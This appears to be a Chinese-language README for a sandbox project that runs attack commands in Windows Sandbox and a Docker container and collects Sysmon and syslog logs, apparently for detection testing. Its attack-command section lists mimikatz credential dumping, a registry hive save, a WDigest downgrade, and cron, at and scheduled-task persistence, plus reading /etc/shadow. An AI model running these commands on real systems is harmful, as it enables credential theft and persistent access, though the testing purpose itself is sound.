# sandbox_test

只需要下載src和test資料夾即可，project環境為windows 10 22H2 pro，需要開啟windows sandbox功能和docker

(如果要看log，可以下載log.xml和container_syslog.log)

## 執行code
如果想要用pytest測試的話，使用以下架構:
```
-root(root資料夾不限名稱)
    -src
        -SandboxFiles
            mimikatz.exe
            Sysmon64.exe
            sysmonconfig.xml: 
            (sandbox.wsb): 由code自動產生
            (install_and_run.bat): 由code自動產生
            (log.xml): 由code自動產生
        Dockerfile
        sand.py
        (container_syslog.log): 由code自動產生
    -test
        test_sand_unit.py
        test_sand_integrated.py
```
在root資料夾下執行```pytest -vv --cov -p no:warnings```

如果要執行sand.py，把最後兩行註解取消掉再執行

(Windows sandbox如果出現強制斷線，屬於正常現象，直接點否即可，不影響執行)

## 攻擊指令

windows
```
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords full" exit
copy %USERPROFILE%\Desktop\SandboxFiles\sysmonconfig.xml .

whoami

xcopy %USERPROFILE%\\Desktop\\SandboxFiles . /H /Y

reg save HKLM\SYSTEM C:\\system.save

reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
     
setlocal enabledelayedexpansion

:: Get the current time
for /f "tokens=1-4 delims=:.," %%a in ("%time%") do (
    set /a HH=%%a, MM=%%b, SS=%%c, FF=%%d
)

:: Add 10 seconds
set /a MM+=1
if !MM! geq 60 (
    set /a MM-=60
    set /a HH+=1
    if !HH! geq 24 set /a HH-=24
)

:: Format the time with leading zeros
if !HH! lss 10 set HH=0!HH!
if !MM! lss 10 set MM=0!MM!
echo !HH!:!MM!
:: Create the scheduled task
schtasks /create /tn "MyTask" /tr "notepad.exe" /sc once /st !HH!:!MM! /f
```

linux
```
whoami
echo 'whoami'> tmp
cp tmp tmp2
sh < tmp2
cat /etc/shadow
echo \"echo hash_value > name.out\" | at now + 1 minute
echo \"*/2 * * * * root whoami > username\" >> /etc/crontab
```

## 有關log

log.xml是windows的log

container_syslog.log是linux的log

另外，執行code後，log的位置分別是```root/src/SandboxFiles/log.xml```和```root/src/container_syslog.log```
